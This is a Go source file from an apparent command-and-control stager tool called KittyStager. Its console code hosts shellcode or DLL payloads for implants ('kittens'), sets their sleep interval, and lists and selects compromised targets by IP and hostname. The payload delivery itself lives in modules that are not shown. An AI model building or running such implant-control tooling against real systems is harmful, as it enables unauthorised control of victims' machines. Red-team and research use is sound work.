package cli

import (
	"KittyStager/cmd/config"
	"KittyStager/cmd/httpUtil"
	"KittyStager/cmd/util"
	"fmt"
	i "github.com/JoaoDanielRufino/go-input-autocomplete"
	color "github.com/logrusorgru/aurora"
	"strconv"
	"strings"
)

func payload(kittenName string) {
	fmt.Printf("%s\n", color.Yellow("[*] Please enter the path to the payload"))
	var path string
	path, err := i.Read("Path: ")
	if err != nil {
		util.ErrPrint(err)
		return
	}
	if path == "" {
		fmt.Printf("%s\n", color.Red("[!] Please enter a path"))
		return
	}
	if strings.HasSuffix(path, ".dll") {
		fmt.Printf("%s\n", color.Yellow("[*] Please enter the entry point"))
		var function string
		function, err = i.Read("Entry: ")
		if err != nil {
			util.ErrPrint(err)
			return
		}
		err = httpUtil.HostDll(path, function, kittenName)
	} else {
		err = httpUtil.HostShellcode(path, kittenName)
	}
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

func sleep(in []string, kittenName string) {
	if len(in) != 2 {
		util.ErrPrint(fmt.Errorf("invalid input"))
		return
	}
	time, err := strconv.Atoi(in[1])
	if err != nil {
		util.ErrPrint(err)
		return
	}
	err = httpUtil.HostSleep(time, kittenName)
	if err != nil {
		return
	}
}

func interact() {
	printTarget()
	if len(httpUtil.Targets) == 0 {
		fmt.Println(color.Red("No targets"))
		return
	}
	//diretly interact with a target
	if len(httpUtil.Targets) == 1 {
		for _, v := range httpUtil.Targets {
			err := Interact(v.GetTarget())
			if err != nil {
				return
			}
			return
		}
	}
	fmt.Printf("%s", color.Yellow("[*] Please enter the id of the kitten"))
	id, err := i.Read("id: ")
	if err != nil {
		util.ErrPrint(err)
		return
	}
	s, err := strconv.Atoi(id)
	if err != nil {
		util.ErrPrint(fmt.Errorf("invalid input"))
		return
	}
	kittenName, err := findId(s)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	if _, ok := httpUtil.Targets[kittenName]; !ok {
		util.ErrPrint(fmt.Errorf("invalid id"))
		return
	}
	if !httpUtil.Targets[kittenName].GetAlive() {
		util.ErrPrint(fmt.Errorf("this kitten is dead"))
		return
	}
	fmt.Println()
	err = Interact(httpUtil.Targets[kittenName].GetTarget())
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

func printTarget() {
	fmt.Printf("\n%s\n", color.Green("[*] Targets:"))
	fmt.Printf("%s\n", color.Green("Id:\tKitten name:\tIp:\t\tHostname:\t\tLast seen:\tSleep:\tAlive:"))
	fmt.Printf("%s\n", color.Green("═══\t════════════\t═══\t\t═════════\t\t══════════\t══════\t══════"))

	for name, x := range httpUtil.Targets {
		var e string
		if x.GetAlive() {
			e = "Yes"
			fmt.Printf("%d\t%s\t\t%s\t%s\t\t%s\t%d\t%s\n",
				x.GetId(),
				color.Yellow(name),
				color.Yellow(x.InitChecks.GetIp()),
				color.Yellow(x.InitChecks.GetHostname()),
				color.Yellow(x.GetLastSeen().Format("15:04:05")),
				color.Yellow(x.GetSleep()),
				color.Yellow(e))

		} else {
			e = "No"
			fmt.Printf("%d\t%s\t\t%s\t%s\t\t%s\t%d\t%s\n",
				x.GetId(),
				color.Red(name),
				color.Red(x.InitChecks.GetIp()),
				color.Red(x.InitChecks.GetHostname()),
				color.Red(x.GetLastSeen().Format("15:04:05")),
				color.Red(x.GetSleep()),
				color.Red(e))

		}
	}
	fmt.Println()
}

func findId(id int) (string, error) {
	for _, x := range httpUtil.Targets {
		if x.GetId() == id {
			return x.GetTarget(), nil
		}
	}
	return "", fmt.Errorf("invalid id")
}

func printConfig(conf config.General) {
	fmt.Printf("\n%s\t\t%s\n", color.Green("Host:"), color.Yellow(conf.GetHost()))
	fmt.Printf("%s\t\t%d\n", color.Green("Port:"), color.Yellow(conf.GetPort()))
	fmt.Printf("%s\t%s\n", color.Green("Endpoint:"), color.Yellow(conf.GetEndpoint()))
	fmt.Printf("%s\t%s\n", color.Green("UserAgent:"), color.Yellow(conf.GetUserAgent()))
	fmt.Printf("%s\t\t%d\n", color.Green("Sleep:"), color.Yellow(conf.GetSleep()))
	for _, v := range conf.GetMalPath() {
		fmt.Printf("%s\t%s\n", color.Green("Malware path:"), color.Yellow(v))
	}
	fmt.Println()
}
